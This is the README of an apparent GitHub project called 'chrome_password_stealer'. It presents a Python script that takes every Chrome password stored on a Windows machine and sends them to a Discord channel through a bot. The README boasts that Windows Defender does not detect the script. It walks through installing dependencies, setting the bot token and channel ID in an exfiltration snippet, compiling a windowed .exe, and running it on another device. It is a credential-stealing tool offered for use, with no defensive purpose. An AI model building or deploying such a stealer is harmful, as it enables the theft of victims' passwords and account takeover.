# chrome_password_stealer
This python script steals all the chrome password stored in a device and uploads them into a discord server. This program only works in windows and only for chrome. The windows defender doesn't detect it but maybe other programs can.
## instalation
Download or clone the repository and eecute this command to install all dependencies, if you want to compile to a exe file you will need to install pyinstaller too.
```bash
pip install -r requirements.txt
pip install pyinstaller
```
Before running the code you need to set up some variables
```bash
    @bot.event
    async def on_ready():#when the bot is ready sends the results file to the discord channel
        channel = bot.get_channel("YOUR CHANEL ID")
        if channel:
            await channel.send(file=discord.File('results.json'))
        await bot.close()
    bot.run('YOUR BOT TOKEN') 
```
You need to replace YOUR BOT TOKEN with your actual bot token from discord and YOUR CHANEL ID with the actual chanel id also from discord.

To compile to a .exe file run this command where the chrome.py file is stored
```bash
pyinstaller --onefile --windowed chrome.py
```
## Discord setup
First you need to enable the developer mode for discord. To do so you need to acces the configuration then advanced and enable the developer mode 
![Image of the option to enable](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/developer_mode.png)
Then you need to go to the https://discord.com/developers/ the discord theveloper portal and clic on new application
![Image of the app creation](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/app_creation.png)

Then you ned to navigate to the bot section and create a new bot and enable all types of intents and select administrator on the bot permission settings. Then save the changes.
![Image of the bot configuration](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/intents.png)
![image of the bot configuration](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/intents.png)

Then renew the bot token and paste it into the code where indicated.
### Adding bot to server

Navigate tho the 0auth section and click on bot and then administrator. Once this done select Guild install in the list below. Copy the link and acces to it. Select the server you want to use and click on authorize.

After this is done go back to your discord app and copi the id of the chanel you want the bot to send the file. Do so by left click on the chanel and select copi chanel id.
Then paste the chanel id where indicated in the code.

## results
After you completed all the previous steps you can test the code by running it in your own computer or compiling it and running it in another device.